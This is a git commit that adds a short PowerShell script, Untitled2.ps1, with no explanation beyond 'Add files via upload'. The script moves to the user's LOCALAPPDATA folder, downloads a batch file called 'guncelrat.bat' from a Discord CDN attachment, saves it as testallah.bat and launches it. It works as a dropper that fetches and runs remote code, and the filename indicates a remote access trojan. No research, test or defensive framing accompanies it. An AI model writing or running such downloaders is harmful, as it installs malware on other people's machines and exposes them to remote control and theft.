c09101f6eedbcc07d12db89481696eafe3e497fe
0bsesss <113838619+0bsesss@users.noreply.github.com>
2022-09-19 16:18:35 +0300

    Add files via upload

---
+++ Untitled2.ps1
@@ -0,0 +1,6 @@
+﻿cd $env:LOCALAPPDATA
+
+& ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/963507982962942042/1021144136465784974/guncelrat.bat" -OutFile testallah.bat)))) 
+
+cd $env:LOCALAPPDATA
+start "$env:LOCALAPPDATA\testallah.bat"
